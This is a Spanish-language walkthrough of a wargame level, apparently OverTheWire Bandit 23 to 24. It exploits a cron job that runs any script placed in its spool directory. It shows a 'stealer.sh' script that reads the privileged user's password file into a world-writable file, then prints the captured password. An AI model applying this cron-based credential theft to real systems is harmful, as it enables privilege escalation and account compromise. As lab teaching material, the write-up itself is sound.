El nivel comienza de la misma forma que los anteriores.

```bash
$ ls -al /etc/cron.d/
$ cat /etc/cron.d/cronjob_bandit24
$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

Vemos que ahora, la tarea ejecuta todos los comandos del directorio `/var/spool/$myname/foo`, con `myname=bandit24`.

Primero creamos un directorio temporal, y luego creamos un script que
utilizaremos para obtener la contraseña

```bash
$ cd $(mktemp -d)
$ vim stealer.sh
```

El script debe leer la calve y guardarla en un archivo de la carpeta temporal

```bash
#!/bin/bash

name=$(whoami)
cat /etc/bandit_pass/$name > /tmp/uA4Dcs6VmDWPtw/$name
```

Luego, le damos permisos de ejecución al script. y creamos el archivo objetivo
para poder darle permisos de escritura a todos los usuarios. De esta forma
bandit24 podrá escribir su contraseña allí.

```bash
$ chmod +x stealer.sh
$ touch bandit24
$ chmod 666 bandit24
```

Finalmente copiamos el script a la carpeta leida por bandit24, esperamos un
minuto, y leemos el resultado

```bash
$ cp stealer.sh -t /var/spool/bandit24/foo
$ sleep 60; cat /tmp/uA4Dcs6VmDWPtw/bandit24
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

